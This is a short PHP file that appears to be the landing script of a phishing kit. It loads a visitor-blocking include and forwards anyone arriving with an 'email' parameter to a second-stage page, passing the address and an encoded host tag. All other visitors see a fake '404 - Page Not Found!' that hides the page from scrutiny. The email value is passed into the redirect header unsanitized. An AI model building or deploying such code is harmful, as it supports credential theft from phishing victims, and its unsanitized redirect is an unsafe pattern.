<?php

@ob_start();
ini_set("output_buffering", 4096);
session_start();

require_once 'inc/check_blocked.php';
require_once 'inc/config.php';
require_once 'inc/functions.php';



if (!isset($_SESSION['SESSION_ID'])) {
    $_SESSION['SESSION_ID'] = uniqid(rand(10, 20), true);
}

$host = bin2hex($_SERVER['HTTP_HOST']);

if (!$disable_login_page) {
    /* Detect auto link */
    if (isset($_GET['email'])){
	   header("refresh:0; url=step2.php?email=".$_GET['email']."&p=1&session=" . $host);
    }
    else
        //header("refresh:0; url=step2.php?p=1&session=" . $host);
	die("404 - Page Not Found!");
    exit;
} else {
    die();
}
ob_end_flush();
?>